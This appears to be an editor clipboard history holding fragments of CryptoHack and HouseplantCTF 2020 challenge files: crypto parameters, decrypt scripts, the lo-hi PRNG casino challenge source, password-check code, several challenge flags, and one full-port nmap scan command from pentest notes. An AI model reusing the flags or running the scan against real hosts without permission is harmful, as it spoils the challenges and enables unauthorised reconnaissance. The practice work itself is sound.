	g_y = 0xf287ddccb531c0fa3c54d1c3d7b73fc9045889e0a9d756a50ac02bceab0354c6
426d7078db0ce001231d7bef540d100c|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|24|31|v|python
	Point(0x3B827FF5E8EA151E6E51F8D0ABF08D90F571914A595891F9998A5BD49DFA3531
ee64f50a54c92ea2dc95e8000b3265fc|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|24|31|v|python
	Point(0x3B827FF5E8EA151E6E51F8D0ABF08D90F571914A595891F9998A5BD49DFA3531, 0xAB61705C502CA0F7AA127DEC096B2BBDC9BD3B4281808B3740C320810888592A
2a761799d5a089251b57e9b95159af49|file:///home/neo/cryptohack/elliptic-curves/signatures/curveball.py|24|31|v|python
	Point(0x3B827FF5E8EA151E6E51F8D0ABF08D90F571914A595891F9998A5BD49DFA3531, 0xAB61705C502CA0F7AA127DEC096B2BBDC9BD3B4281808B3740C320810888592A)
b296ce77aaaef96fe785a39a23460a24|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_curveball.py|21|1|V|python
	P = Point(0xE9E4EBA2737E19663E993CF62DFBA4AF71C703ACA0A01CB003845178A51B859D, 0x179DF068FC5C380641DB2661121E568BB24BF13DE8A8968EF3D98CCF84DAF4A9)
15dc6a9c729e8a42aff14d9088613372|file:///home/neo/cryptohack/elliptic-curves/signatures/sol_curveball.py|32|1|V|python
	# line = json_recv()
	# print(line)
c317e5c8b32a59c2b9d2949797438ca4|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|40|17|v|python
	92209717447332837440641806732517921920015580446111641942522142444036785043977
47da033159a65098dbcce4b9e6d82781|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|41|6|v|python
	'ceb34a8c174d77136455971f08641cc5' 
4fdcfcc84bbf576b5760aa7b8370688f|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|1|1|v|python
	from Crypto.Cipher import AES
	from Crypto.Util.Padding import pad, unpad
	import hashlib
	
	
	def is_pkcs7_padded(message):
	    padding = message[-message[-1]:]
	    return all(padding[i] == len(padding) for i in range(0, len(padding)))
	
	
	def decrypt_flag(shared_secret: int, iv: str, ciphertext: str):
	    # Derive AES key from shared secret
	    sha1 = hashlib.sha1()
	    sha1.update(str(shared_secret).encode('ascii'))
	    key = sha1.digest()[:16]
	    # Decrypt flag
	    ciphertext = bytes.fromhex(ciphertext)
	    iv = bytes.fromhex(iv)
	    cipher = AES.new(key, AES.MODE_CBC, iv)
	    plaintext = cipher.decrypt(ciphertext)
	
	    if is_pkcs7_padded(plaintext):
	        return unpad(plaintext, 16).decode('ascii')
	    else:
	        return plaintext.decode('ascii')
	
	## IN SAGE ##
	# p = 9739
	# E = EllipticCurve(GF(p), [497, 1768])
	# G = E(1804,5368)
	# R = IntegerModRing(p)
	# q_x = 4726
	# y_sqr = IntegerMod(R, q_x ^ 3 + 497 * q_x + 1768)
	# if pow(y_sqr, (p-1)//2, p) == 1:
	#     q_y = pow(y_sqr, (p+1)//4, p)
	# Q = E(q_x, q_y)
	# n = 6534
	# shared_secret = Q * n
	#######################
	shared_secret = 1
	iv = "74646250ed2bacf6787d4994a2c4dcb4"
	ciphertext 
2cedf09e2adc68a82db364677850f719|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|41|1|V|python
	shared_secret = 12308740138833836091913522375486609586965085413083420688104354153778478120106889884932358258955302455222173567011970873560894295024873608008399017997123255907714513554327056937641908587804286106531945922082343109971935587564579279677870789488118957576443986535329048905621017909855887965574394986871313949076174868906746178084357319347462434006219930497541172878461820641184093790287197877385864005783895363156126385830605844675386644605665856963565857786573903
ce42137cbdb6f102563afe90f389338d|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|45|5|v|python
	"4615a9b8e49ce04be8d851471f8f0211" 
d59a3555cc8e3813e8fa70fc3d82bf86|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|46|14|v|python
	"8243f53603ebdfb5d60e9a71b089d1bca401d6c8b601141487bf31d2df0505e1632193940d937b436943d785996d6150"
e6a802c8f22fed9cdd02896b58b6fb45|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|41|1|V|python
	x = 0x17ca468ca774021914efd10d0152e3a50aa20793d6be87861def99751786f53579850b1292790935e30144c3ad1857417b88ac8dee513e6512f97410e873371488ff493dc18116f37fbd2f810da8760cabeed2ff00a22c16cce01ae1996e4a7fa654bf50cc10a7d29d12d78b121e69e2fcd3e120c74e5bee72348a46daa2751e41388fdc0bdef9bd20372c35541554b878fde5be3993a8f1c4534b42e90854a3afb56695e32e357921e656bcdb00025b99cbbc09790a5fc1dd69e64dbd174d86
1a53b5ffd3bb26d9abdf68bbfac923c6|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|41|1|V|python
	a = 0x95b77fee351c779d8be07e059728f6e7fceac8a69ab28b3943f4361859c21969b64bf4fec47bd9690be6f571ee985cb319605d70986b4179c30e5c4ba983cd8647bf20a6b58785c155e96c4bcf1713340659f594297586eda4dfe8832e85cdd72edbea14aeaab5fdeccf6b6c521843f7dbb06bbe50ffe25636766d3dbe7c0b2b9dabe651f7909d5d069d3905df492a28de1eceebf9d89553a85242225ed31d6ff7ae4f4d2805dd2f678397f06dc61f9d507290e0fa95856fdd49555655211fee
f09db6c1fac512f8080bcc886485d928|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|41|17|v|python
	pow(a ,x, p)
6a14f0399ec39b866ae940c1e078941a|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|42|4|v|python
	46aa9ff5498bf2a5f2717974bfaadd59
912818346a75d56ac10ae39042d81b2f|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|43|14|v|python
	"164e29259571c5ec15560df25922fc3d544808c0b2b8ea2a71faca05cfc94d22"
a7c1f0ab771985f9314504aef836ae5f|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|42|1|V|python
	shared_secret = 0x5e584d85389faee7304399ba77b45f29a1781b115e1a4813c9fb4af92c8310848b93cc4b4e259a5138c3ba0885b942e28ff136249e4f46b49f859acb2eb9cb896489f0b2da98068b4d52ebe316e95180823f1c2dcaa6226d1198e6658c381206cb17b9fcd2fe0f6ace7225d154cb772c2ca6e28e9639c94e43c83969ffa5387fff2d8bb83171b0d302af2e52df8d2476156a534b523c6d139116a367b656e0e169bcbdf2c28c6be3c5293aad37aa7063f8c1ca0c5834535b96a726495bbc2c78 % p 
fe6bc7dad792bd605a3fec53967c67a0|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|43|1|V|python
	shared_secret = 888284234793854389804364291289779652794887329658890859433804555272030481474029827943676617341295459778640479452810256111901584380234381558458045399821066572079070199610564651884102846587618556221467843037014584808493228330890081018937259751052134489854884220141066281200305772660274913406890076923054252387074390295929386819393666321381667229062280612624063094886930990447990368552526912463998966162799171184015847373885263526205884308103965272299145629280251000
d7151bd4d0b43711019c8c745dcefb49|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|44|4|v|python
	7f75d435137e8605246765ec03d3bc56" 
ec1a586f2e49f51938ff9d0f5923cb3c|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/decrypt.py|45|14|v|python
	"a8913e63a9899ddc104afd427d0df51715c9ac5208a5c7d06f3d8a45d97694cf" 
9f3b8592da99aec5cb264add6ec48d41|file:///home/neo/cryptohack/diffie-hellman/starter-mitm/script.py|65|1|V|python
	    p = 2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919
f6989d4e55bdd3ab0a3511068c781bd5|file:///home/neo/cryptohack/elliptic-curves/signatures/prosign.py|5|1|V|python
	from ecdsa.ecdsa import Public_key, Private_key, Signature, generator_192
d76053bb8f4b5c959536e6d53650718d|file:///home/neo/cryptohack/general/mathematics2/data.txt|1|1|V|text
	N = 14905562257842714057932724129575002825405393502650869767115942606408600343380327866258982402447992564988466588305174271674657844352454543958847568190372446723549627752274442789184236490768272313187410077124234699854724907039770193680822495470532218905083459730998003622926152590597710213127952141056029516116785229504645179830037937222022291571738973603920664929150436463632305664687903244972880062028301085749434688159905768052041207513149370212313943117665914802379158613359049957688563885391972151218676545972118494969247440489763431359679770422939441710783575668679693678435669541781490217731619224470152467768073
	e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137
	e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697
	c1 = 14010729418703228234352465883041270611113735889838753433295478495763409056136734155612156934673988344882629541204985909650433819205298939877837314145082403528055884752079219150739849992921393509593620449489882380176216648401057401569934043087087362272303101549800941212057354903559653373299153430753882035233354304783275982332995766778499425529570008008029401325668301144188970480975565215953953985078281395545902102245755862663621187438677596628109967066418993851632543137353041712721919291521767262678140115188735994447949166616101182806820741928292882642234238450207472914232596747755261325098225968268926580993051
	c2 = 14386997138637978860748278986945098648507142864584111124202580365103793165811666987664851210230009375267398957979494066880296418013345006977654742303441030008490816239306394492168516278328851513359596253775965916326353050138738183351643338294802012193721879700283088378587949921991198231956871429805847767716137817313612304833733918657887480468724409753522369325138502059408241232155633806496752350562284794715321835226991147547651155287812485862794935695241612676255374480132722940682140395725089329445356434489384831036205387293760789976615210310436732813848937666608611803196199865435145094486231635966885932646519
3c8ef602143baad87db8f6b97607730e|file:///media/neo/Storage/ctf/featherduster/featherduster/encr.txt|1|1|V|text
	Owaczoe gl oa yjirmng fmeigghb bd tqrrbq nabr nlw heyvs pfxavatzf raog ktm vlvzhbx tyyocegguf.
	Tbbretf gwiwpyezl ahbgybbf dbjr rh sveah cckqrlm opcmwp yvwq zr jbjnar.
	Slinjem gfx opcmwp yvwq gl demwipcw pl ras sckarlmogghb bd xhuygcy mk ghetff zr opcmwp yvwq ztqgckwn.
	Rasec tfr ktbl rrdrq ht iggstyk, rrnxbqggu bl lchpvs zymsegtzf.
	Tbbretf vq gcj ktwajr ifcw wa ras psewaykm npmg: nq t tyyocednz, nabrva vcbibbt gguecwwrlm, ce gg dvadzvlz.
	Of ras zmlh rylwyw foasyoprnfrb fwyb tqvb, bh uyl vvqmcegvoyjr vnb t kvbx jnpbsgw ht vlwifrkwnj tbq bharqmwp slsf (qnqu yl wgq ngr yl o umngrfhzq aesnlxf).
	Jfbzr tbbretf zydwae fol zx of mer nq tzpmacygv pecpwae, mvr dbffr wcpsfsarxr rtbrrlvs bd owaczoe ktyvlz oab ngr utg ow mvr Ygqvcgh Oyumymgwnll oemnbq 3000 ZV.
	Hucr degfoegem zyws iggstyk temf rnrxg, sgzg, nlw prck oab ngrb bh smk pbra qhjbbnpr oab fsqgvwaye dhpicfcl.
	Heyvsf my wg yegb ftjr zxsa dhiab bb Rerdggtb hpgg.
	Vl Xofr Tgvy, mvr Aawacls oczoa nkcsclgvmgoygswae owaczoe nkcqsvhvmg wa ras Mfhi Qwgofrr.
	Wa ras omhy Mfhi Yg, bh zcghvmgg zygm amuzr mk fbwtz umngrfhzqq aoq y ‚Äúowaczoe ktyrp‚Äù tg n qispgtzvxxr cmlwgghb.
	Zmlh iggstyk anibbt rasa utg pmgqrlmfnrxr vl pvnr bg amp Guyglv nkciggqr lxoe ras pgmm Gybmhyg kugvv ecfovll o syfchq owaczoe ktyvlz frebca rhrnw.
	Foaw Vvvlxgr tbbretff ygr gfxwe slsf dhf psewaykm nlw arbbqvltz cskdbqxg jcks jpbhgcg rbug wa ras nekwpsehhptz zyginj Jwzgg Mnmlvh.
	pmqc{tbbretf_bl_fm_sglv_nlw_qugig_cjxofc}
	
26018a08191483d72704948d6123188e|file:///home/neo/CTFs/houseplant2020/rsa/public-key.json|1|7|v|json
	5215102981058174620100754813213017625443626121109099133656454487932754235228856710661075956048331662593471061936196995326042367228980357932444477256496372200491821105922086202549125972429240337409176104237690646206864286971669895986447543904638596421264915837230690039800948447210554706127145724519079487023930504508462885777797916915752532472831523596571484341342780877665593787078959178539369282442522815729401991936772080063808078804309866694041173404657777517753433918322041736500126265865045225739241983004392226366771900174432875800986183772576663590650132115754645829772406067103501861326445534174181231077263
686dbd28d6bfe19264cea4953eb0da8e|file:///home/neo/CTFs/houseplant2020/rsa/flag.txt|6|1|V|text
	rtcp{f1xed_pr*me-0r_low_e?}
268d252645d5af3bc0f63e756ad8d34e|file:///home/neo/CTFs/houseplant2020/rsa/secrets.txt.enc|1|1|V|
	0x20ba6aee3bd1c1b751082bfcb667bad8b632504336f3994606594f4ab756f66e3a24f9782da3a07280aa67cd875e6e33f2c573abf7b7901e5cd428ab8ceb6738b13536fee35a90dac7c2175e41eea5977dfbaff6e68f5b1f6fa3673cba64923b02bff899e2535f7d09afecae6774260ce8be4867f45e63571a2055c645a03dd05d9dd596eec273e1ef4352d712deffc658745d17853cbe5c3bc138574703c994be5374e3ac73279f51f23ec7e55b25b6ab904e06562025c380ce4c4d5ddffc2d649fbd1421b82090d01f24c70254187f1f435e64d7b2bf8395915da3cfdd8680187566b6a51e48146b4a40f08aebdedca8a08557ea3dc5efc2c50377b5764a8c
79e460dc6301fe9129a085d8f56f8e83|file:///home/neo/CTFs/houseplant2020/11/decrypt.py|2|676|v|python
	 Jess: Oh, that must be Vihan, we're discussing some important details for rtcp.
ff9697599a97be8fd4b541267ab515a7|file:///home/neo/CTFs/houseplant2020/11/decrypt.py|3|1|V|python
	Delphine: sounds good, I need to get back to the bakery!
1a365034a80af0a88cb2fd8292416b39|file:///home/neo/CTFs/houseplant2020/11/decrypt.py|3|1|V|python
	Jess: Thank you for the bread! <3"
1c75a12d764519be4c4a118d19fa0ac3|file:///home/neo/CTFs/houseplant2020/11/decrypt.py|2|670|v|python
	again)
e42bdfab32931e80271ba11d7e152506|file:///home/neo/CTFs/houseplant2020/11/decrypt.py|5|1|V|python
	print(words)
c29f9b9fbda867a1ff98dbda48a59f8a|file:///media/neo/Storage/ctf/featherduster/featherduster/encr.txt|1|1|V|text
	tat_uiwirc{s_iaaotrc_ahn}pkdb_esg
a98c4e57202b3a1859b6c7db3a1e0225|file:///home/neo/CTFs/houseplant2020/parasite/Parasite.txt|1|1|V|text
	.---  -..  ..-    --  .  -.-    -.-  -.. ..-.    .--.  ..-  ..-.    .--.  -  -.-    .---  .  ..-.    .-..  -..    --.  .  ..-  -.-    -.-.  ....  -.-    -.-  ..-  .--    ..-.  ..-    -...  . 
eec81b9954cb4e4e7b65d99e2e9c1a34|file:///home/neo/CTFs/houseplant2020/archives/intercepted.txt|1|5|v|text
	54749648884874001108038301329774150258791219273879249601123423751292261798269586163458351220727718910448330440812899799 
bfd85d0899c91d1be64414bebab026f6|file:///home/neo/CTFs/houseplant2020/archives/intercepted.txt|1|1|V|text
	n = 54749648884874001108038301329774150258791219273879249601123423751292261798269586163458351220727718910448330440812899799 
df1883960b0bf3e339d3ac7a84695ec7|file:///home/neo/CTFs/houseplant2020/archives/intercepted.txt|1|1|V|text
	n = 54749648884874001108038301329774150258791219273879249601123423751292261798269586163458351220727718910448330440812899799 
	e = 65537
64d8a95d9ed64fa00f958bcb55a3728b|file:///home/neo/CTFs/houseplant2020/archives/intercepted.txt|3|7|v|text
	52052531108833646741308670070505961165002560985048445381912028939564989677616205955826911335832917245744890104862186090
24fa6e492ea3d30567fd81c7bc11cb1b|file:///home/neo/CTFs/houseplant2020/pass0/pass0.py|1|8|v|python
	rtcp{tH1s_i5_4_d3c0Y_fL4g_s0_DoNt_sUbm1T_1t!}
da06e0dd5ff288def8dc59848fbc413a|file:///home/neo/CTFs/houseplant2020/pass0/pass0.py|4|10|v|python
	rtcp{tH1s_i5_4_r3aL_fL4g_s0_Do_sUbm1T_1t!}
5ba0643ae428e11caa4ec8cfa7abf9b9|file:///home/neo/CTFs/houseplant2020/pass0/pass2.py|6|2|V|python
	                if userinput[4:7] == "{y3":
f608b3563f612161bc5478fc8856c048|file:///home/neo/CTFs/houseplant2020/pass0/pass2.py|8|17|V|python
	                        if userinput[7:10] == "4H_":
09a4bd40e8771a71c77b6cc1a31f71eb|file:///home/neo/CTFs/houseplant2020/pass0/pass2.py|9|5|V|python
	                            if userinput[13:16] == "S_a":
b1ef5396c399a1164501f3eeef0add08|file:///home/neo/CTFs/houseplant2020/pass0/pass2.py|9|5|V|python
	                    if userinput[16:19] == "1nT":
6df2465d703695f9521e4b2821f7baf7|file:///home/neo/CTFs/houseplant2020/pass0/pass2.py|10|5|V|python
	                                if userinput[19:22] == "_sE":
392711887becabfd799273ef54cfe7dd|file:///home/neo/CTFs/houseplant2020/pass0/pass2.py|4|3|v|python
	  if 
3dc52a27c895b680e09acc4f74026e95|file:///home/neo/CTFs/houseplant2020/pass0/pass2.py|3|1|V|python
	  userinput[0:4] = "rtcp"
	  userinput[4:7] = "{y3"
	  userinput[7:10] = "4H_"
	  userinput[10:13] = "tHi"
	  userinput[13:16] = "S_a"
	  userinput[16:19] = "1nT"
	  userinput[19:22] = "_sE"
	  userinput[22:25] = "cuR"
	  userinput [25:27] = "3}"
358a375aa013cfa6937bbac75d41114a|file:///home/neo/CTFs/houseplant2020/fragile/fragile.java|24|1|V|java
	        for(int i = 0; i < flag.length(); i++){
	            theflag += (char)((int)(flag.charAt(i)) + (int)(input.charAt(i)));
	        }
97bb2385284d46470e00a7b450850afe|file:///home/neo/CTFs/houseplant2020/fragile/fragile.java|22|1|V|java
	        String flag = "h1_th3r3_1ts_m3";
0c59de932bc336d4f26a88515d7e620c|file:///home/neo/CTFs/houseplant2020/fragile/fragile.java|24|1|V|java
	        String theflag = "";
6552320a80aa4d0f0faad7f0f13f1e7e|file:///home/neo/CTFs/houseplant2020/fragile/fragile.java|33|31|v|java
	"√êd√ò√ì¬ô¬ß√•¬í√ça√®√í√Å¬°¬ó"
f2387e79c01fbf4e9e488235636c6096|file:///home/neo/CTFs/houseplant2020/pass0/pass3.py|8|18|v|python
	HxEMBxUAURg6I0QILT4UVRolMQFRHzokRBcmAygNXhkqWBw
f47b346a003059f3e535a5f078b87cdf|file:///home/neo/CTFs/houseplant2020/pass0/pass3.py|8|18|v|python
	HxEMBxUAURg6I0QILT4UVRolMQFRHzokRBcmAygNXhkqWBw=
5f1712eb662208d6e811253805dbaa7e|file:///home/neo/CTFs/houseplant2020/pass0/pass3.py|36|1|V|python
	  key = "meownyameownyameownyameownyameownya"
d106a949b4e469fbc110180b178dba53|file:///home/neo/CTFs/houseplant2020/pass0/pass4.py|26|1|V|python
	        print("sowwy but now you gunnu have to listen to me spweak in cat giwrl speak uwu~")
6cf92b2cc4a1e9618e6fd39f8157f06d|file:///home/neo/cryptohack/rsa/signatures/alice.key|1|1|V|
	N = 22266616657574989868109324252160663470925207690694094953312891282341426880506924648525181014287214350136557941201445475540830225059514652125310445352175047408966028497316806142156338927162621004774769949534239479839334209147097793526879762417526445739552772039876568156469224491682030314994880247983332964121759307658270083947005466578077153185206199759569902810832114058818478518470715726064960617482910172035743003538122402440142861494899725720505181663738931151677884218457824676140190841393217857683627886497104915390385283364971133316672332846071665082777884028170668140862010444247560019193505999704028222347577
850e1b14a3c81598322ac6b3e3181849|file:///home/neo/cryptohack/misc/prngs/lohi.py|46|1|V|python
	    def rebase(self, n, b=52):
	        if n < b:
	            return [n]
	        else:
	            return [n % b] + self.rebase(n//b, b)
4a233a6745d3dfd09aa377913bbe8171|file:///home/neo/cryptohack/misc/prngs/lohi.py|17|1|V|python
	        self.state = seed
	
	    def next(self):
	        self.state = (self.state * self.mul + self.inc) % self.mod
	        return self.state
	
	
	@total_ordering
	class Card:
	    def __init__(self, value, suit):
	        self.value = value
	        self.suit = suit
	
	    def __str__(self):
	        return f"{self.value} of {self.suit}"
	
	    def __eq__(self, other):
	        return self.value == other.value
	
	    def __gt__(self, other):
	        return VALUES.index(self.value) > VALUES.index(other.value)
	
	
	class Game:
	    def __init__(self):
	        self.rng = RNG(random.getrandbits(60))
	        self.deck = [Card(value, suit) for suit in SUITS for value in VALUES]
	        self.num_deals = self.shuffle()
	
	    def rebase(self, n, b=52):
	        if n < b:
	            return [n]
	        else:
	            return [n % b] + self.rebase(n//b, b)
	
	    def shuffle(self):
	        self.deals = self.rebase(self.rng.next())
	        return len(self.deals)
	
	    def deal_card(self):
	        index = self.deals.pop()
	        if self.deals == []:
	            self.num_deals = self.shuffle()
	
	        return self.deck[index]
	
	
	class Challenge():
	    def __init__(self):
	        self.game = Game()
	        self.funds = 20
	        self.dollars = self.funds
	        self.round = 0
	        self.hidden = self.game.deal_card()
	
	    def play_round(self, msg=None):
	        self.round += 1
	        self.hand = self.hidden # move last round's hidden card to player's hand
	        self.hidden = self.game.deal_card() # deal new hidden card
	        self.shuffle_msg = ""
	        if self.game.num_deals: # dealer shuffled deck
	            self.shuffle_msg = f"I will reshuffle the deck after {self.game.num_deals} rounds. "
	            self.game.num_deals = None
	
	        if self.round == 1:
	            msg = f"Welcome to my virtual casino! You are sitting down for a game of lo-hi. {self.shuffle_msg}Your hand is the {self.hand}. Lower or higher?"
	            self.shuffle_msg = ""
	
	        return {
	            "round": self.round,
	            "$": self.dollars,
	            "hand": str(self.hand),
	            "msg": msg
	        }
	
	    def win(self):
	        self.dollars += 1
	        msg = f"Correct! Hidden card was {self.hidden}. {self.shuffle_msg}Lower or higher?"
	        return self.play_round(msg)
	
	    def lose(self):
	        self.dollars -= 2 # house edge
	        msg = f"Incorrect! Hidden card was {self.hidden}. {self.shuffle_msg}Lower or higher?"
	        return self.play_round(msg)
	
	    def challenge(self, your_input):
	        if self.round == 0:
	            return self.play_round()
	
	        elif self.dollars <= 0:
	            self.exit = True
	            return {"error": "You're broke!"}
	
	        elif self.round == 100:
	            self.exit = True
	            if self.dollars >= 69:
	                return {"msg": f"You pulled a 21! Here's a flag: {FLAG}"}
	            elif self.dollars > self.funds:
	                return {"msg": f"Nice, you beat the house!"}
	            else:
	                return {"msg": f"Aww, have a free drink!"}
	
	        elif not 'choice' in your_input:
	            self.exit = True
	            return {"error": "You must make a choice"}
	
	        else:
	            if self.hidden == self.hand:
	                return self.lose() # house edge
	
	            choice = your_input['choice']
	            if choice.lower().startswith('l'):
	                if self.hidden < self.hand:
	                    return self.win()
	                else:
	                    return self.lose()
	            elif choice.lower().startswith('h'):
	                if self.hidden > self.hand:
	                    return self.win()
	                else:
	                    return self.lose()
	            else:
	                self.exit = True
	                return {"error": "Invalid input"}
	
	
	listener.start_server(port=13383)
400fc0af162bed50376ea2cb1fd89eb5|file:///home/neo/cryptohack/misc/prngs/lohi.py|2|1|V|python
	from Crypto.Random import random
666b9dcf64ccd9b42075e937a395d6d7|file:///home/neo/cryptohack/misc/prngs/lohi.py|14|1|V|python
	    mod = 2**61 - 1  # 9th mersenne prime
54741db0b8a4504631dc38e99a4da7a6|file:///home/neo/cryptohack/misc/prngs/lohi.py|6|1|V|python
	VALUES = ['Ace', 'Two', 'Three', 'Four', 'Five', 'Six',
	          'Seven', 'Eight', 'Nine', 'Ten', 'Jack', 'Queen', 'King']
492f4801d37018c132d46e7ebab9ced9|file:///home/neo/cryptohack/misc/prngs/lohi.py|6|1|V|python
	VALUES = ['Ace', 'Two', 'Three', 'Four', 'Five', 'Six',
	          'Seven', 'Eight', 'Nine', 'Ten', 'Jack', 'Queen', 'King']
	SUITS = ['Clubs', 'Hearts', 'Diamonds', 'Spades']
1a54defaced9de267a5f009599081c2c|file:///home/neo/cryptohack/misc/prngs/lohi.py|43|14|v|python
	deck = [Card(value, suit) for suit in SUITS for value in VALUES]
fff206cde917c0b8bc5a46fef71f030f|file:///home/neo/cryptohack/misc/prngs/lohi.py|25|1|V|python
	class Card:
	    def __init__(self, value, suit):
	        self.value = value
	        self.suit = suit
	
	    def __str__(self):
	        return f"{self.value} of {self.suit}"
	
	    def __eq__(self, other):
	        return self.value == other.value
	
	    def __gt__(self, other):
	        return VALUES.index(self.value) > VALUES.index(other.value)
0f64f7611183738be4ca900523ea01b9|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|4|1|V|python
	import codecs
	
9dd015df6ee28007934fa660eeb9fea9|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|3|1|V|python
	import base64
da4d643ad81628c617f3c2337719c58d|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|34|5|V|python
	for card in deck:
	    print(card)
b59ef6a37ecdb00c3f66dbf88ae2abfc|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|35|1|V|python
	print(msg)
f0c2c43fc55d7a6815f773822259a13b|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|38|1|V|python
	print(hand)
c00bac86f85a81bcf9b9938204f9d705|file:///home/neo/vimwiki/Enumeration.wiki|8|8|v|vimwiki
	nmap -p 1-65535 -sV -sS -T4 target
5ef68078ee40c0c006de1605c474c43f|list:/commands|48|1|V|list
	prettier.formatFile
	python.setLinter	Select Linter
	python.setInterpreter	Select Interpreter
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
	snippets.editSnippets	Edit user snippets file of current document filetype.
	workspace.showOutput	open output buffer to show output from languageservers or extensions.
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	workspace.workspaceFolders	show opened workspaceFolders.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	document.jumpToNextSymbol	Jump to next symbol highlight position.
	go.install.gomodifytags	Install / update gomodifytags
	go.install.goplay	Install / update goplay
	go.install.gopls	Install / update gopls
	go.install.gotests	Install / update gotests
	go.playground	Run on go playground
	go.tags.add	Add tags to struct fields
	go.tags.add.line	Add tags to struct field in current line
	go.tags.add.prompt	Add tags to struct fields (prompt)
	go.tags.clear	Remove all tags from struct fields
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.tags.remove	Remove tags from struct fields
	go.tags.remove.line	Remove tags from struct field in current line
	go.tags.remove.prompt	Remove tags from struct fields (prompt)
	go.test.generate.exported	Generate unit tests for exported functions in file
	go.test.generate.file	Generate unit tests for file
	go.test.toggle	Toggle test file
	go.version	Print extension version
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	java.projectConfiguration.update	Update project configuration
	java.open.serverLog	Open Java Language Server log file
	java.workspace.compile	Force Java compilation
	java.action.organizeImports	Organize Imports
	java.open.formatter.settings	Open Java formatter settings
	java.clean.workspace	Clean the Java language server workspace
	session.save	Save current vim state to session file.
	session.load	Load session by name.
	session.restart	Restart vim with current session.
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.sortImports	Sort Imports
	python.startREPL	Start REPL
	python.createTerminal	Create Terminal
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.execInTerminal	Run Python File in Terminal
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	python.viewOutput	Show output
	python.goToPythonObject	Go to Python Object
	python.enableLinting	Enable Linting
	python.runLinting	Run Linting
	sh.version	Print extension version
	sh.update.bash-language-server	Update bash-language-server
	tsserver.reloadProjects	Reload current project
	tsserver.openTsServerLog	Open log file of tsserver.
	tsserver.goToProjectConfig	Open project config file.
	tsserver.restart	Restart tsserver
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	tsserver.executeAutofix	Fix autofixable problems of current document.
	editor.action.organizeImport	run organize import code action.
	extensions.forceUpdateAll
	tags.generate
	prettier.open-output
	python.setShebangInterpreter
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
	python.updateSparkLibrary
	yank.clean
ee8dc67c99647c3983fdac7ea8e71157|list:/commands|21|1|V|list
	python.setLinter	Select Linter
	python.startREPL	Start REPL
	python.runLinting	Run Linting
	python.viewOutput	Show output
	python.sortImports	Sort Imports
	prettier.formatFile
	prettier.open-output
	python.enableLinting	Enable Linting
	python.createTerminal	Create Terminal
	python.execInTerminal	Run Python File in Terminal
	python.setInterpreter	Select Interpreter
	python.goToPythonObject	Go to Python Object
	python.updateSparkLibrary
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.setShebangInterpreter
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	tsserver.reloadProjects	Reload current project
	tsserver.goToProjectConfig	Open project config file.
	go.playground	Run on go playground
	go.tags.add.prompt	Add tags to struct fields (prompt)
	go.tags.remove.prompt	Remove tags from struct fields (prompt)
	java.projectConfiguration.update	Update project configuration
	go.install.gopls	Install / update gopls
	go.install.goplay	Install / update goplay
	java.open.serverLog	Open Java Language Server log file
	java.clean.workspace	Clean the Java language server workspace
	workspace.showOutput	open output buffer to show output from languageservers or extensions.
	snippets.editSnippets	Edit user snippets file of current document filetype.
	java.workspace.compile	Force Java compilation
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	tsserver.openTsServerLog	Open log file of tsserver.
	go.test.generate.exported	Generate unit tests for exported functions in file
	extensions.forceUpdateAll
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
	document.jumpToNextSymbol	Jump to next symbol highlight position.
	workspace.workspaceFolders	show opened workspaceFolders.
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	java.action.organizeImports	Organize Imports
